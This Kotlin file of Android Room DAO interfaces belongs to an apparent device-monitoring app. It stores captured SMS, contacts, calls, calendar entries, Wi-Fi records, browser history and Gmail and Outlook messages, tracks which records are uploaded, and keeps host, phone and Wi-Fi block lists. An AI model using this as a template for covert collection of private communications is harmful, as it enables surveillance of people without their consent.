package com.empresa.monitor.data.db.dao

import androidx.room.*
import com.empresa.monitor.data.db.entity.*

@Dao
interface SmsDao {
    @Query("SELECT * FROM sms WHERE uploaded = 0 ORDER BY date DESC")
    suspend fun getUnuploaded(): List<SmsEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(sms: SmsEntity)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insertAll(smsList: List<SmsEntity>)

    @Query("UPDATE sms SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM sms WHERE address = :phone ORDER BY date DESC LIMIT 50")
    suspend fun getByPhone(phone: String): List<SmsEntity>

    @Query("SELECT * FROM sms ORDER BY date DESC LIMIT 200")
    suspend fun getAll(): List<SmsEntity>

    @Query("DELETE FROM sms WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface ContactDao {
    @Query("SELECT * FROM contact WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<ContactEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(contact: ContactEntity)

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(contacts: List<ContactEntity>)

    @Query("UPDATE contact SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM contact ORDER BY name ASC")
    suspend fun getAll(): List<ContactEntity>

    @Query("SELECT * FROM contact WHERE phone = :phone LIMIT 1")
    suspend fun getByPhone(phone: String): ContactEntity?

    @Query("DELETE FROM contact WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface CalendarDao {
    @Query("SELECT * FROM calendar_log WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<CalendarEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(event: CalendarEntity)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insertAll(events: List<CalendarEntity>)

    @Query("UPDATE calendar_log SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM calendar_log WHERE start_time >= :from ORDER BY start_time ASC")
    suspend fun getFromDate(from: Long): List<CalendarEntity>

    @Query("DELETE FROM calendar_log WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface WifiDao {
    @Query("SELECT * FROM wifi_record WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<WifiEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(wifi: WifiEntity)

    @Query("UPDATE wifi_record SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM wifi_record ORDER BY recorded_at DESC LIMIT 100")
    suspend fun getRecent(): List<WifiEntity>

    @Query("SELECT * FROM wifi_record WHERE ssid = :ssid LIMIT 1")
    suspend fun getBySsid(ssid: String): WifiEntity?

    @Query("DELETE FROM wifi_record WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface BrowserHistoryDao {
    @Query("SELECT * FROM browser_history WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<BrowserHistoryEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(entry: BrowserHistoryEntity)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insertAll(entries: List<BrowserHistoryEntity>)

    @Query("UPDATE browser_history SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM browser_history ORDER BY last_visited DESC LIMIT 200")
    suspend fun getAll(): List<BrowserHistoryEntity>

    @Query("DELETE FROM browser_history WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface CallRecordDao {
    @Query("SELECT * FROM call_record WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<CallRecordEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(call: CallRecordEntity)

    @Query("UPDATE call_record SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM call_record ORDER BY call_date DESC LIMIT 200")
    suspend fun getAll(): List<CallRecordEntity>

    @Query("DELETE FROM call_record WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface GmailDao {
    @Query("SELECT * FROM gmail_capture WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<GmailEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(email: GmailEntity)

    @Query("UPDATE gmail_capture SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM gmail_capture ORDER BY timestamp DESC LIMIT 200")
    suspend fun getAll(): List<GmailEntity>

    @Query("DELETE FROM gmail_capture WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface OutlookDao {
    @Query("SELECT * FROM outlook_capture WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<OutlookEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(email: OutlookEntity)

    @Query("UPDATE outlook_capture SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("SELECT * FROM outlook_capture ORDER BY timestamp DESC LIMIT 200")
    suspend fun getAll(): List<OutlookEntity>

    @Query("DELETE FROM outlook_capture WHERE uploaded = 1")
    suspend fun deleteUploaded()
}

@Dao
interface BlockBrowserDao {
    @Query("SELECT * FROM block_browser")
    suspend fun getAll(): List<BlockBrowserEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(block: BlockBrowserEntity)

    @Delete
    suspend fun delete(block: BlockBrowserEntity)

    @Query("DELETE FROM block_browser WHERE host = :host")
    suspend fun deleteByHost(host: String)

    @Query("SELECT * FROM block_browser WHERE host = :host LIMIT 1")
    suspend fun isBlocked(host: String): BlockBrowserEntity?
}

@Dao
interface BlockPhoneDao {
    @Query("SELECT * FROM block_phone")
    suspend fun getAll(): List<BlockPhoneEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(block: BlockPhoneEntity)

    @Delete
    suspend fun delete(block: BlockPhoneEntity)

    @Query("SELECT * FROM block_phone WHERE phone_num = :phone LIMIT 1")
    suspend fun isBlocked(phone: String): BlockPhoneEntity?
}

@Dao
interface BlockWifiDao {
    @Query("SELECT * FROM block_wifi")
    suspend fun getAll(): List<BlockWifiEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(block: BlockWifiEntity)

    @Delete
    suspend fun delete(block: BlockWifiEntity)

    @Query("SELECT * FROM block_wifi WHERE bssid = :bssid LIMIT 1")
    suspend fun isBlocked(bssid: String): BlockWifiEntity?
}

@Dao
interface DeviceLogDao {
    @Query("SELECT * FROM device_log WHERE uploaded = 0")
    suspend fun getUnuploaded(): List<DeviceLogEntity>

    @Insert
    suspend fun insert(log: DeviceLogEntity)

    @Query("UPDATE device_log SET uploaded = 1 WHERE id = :id")
    suspend fun markUploaded(id: Long)

    @Query("DELETE FROM device_log WHERE uploaded = 1")
    suspend fun deleteUploaded()
}
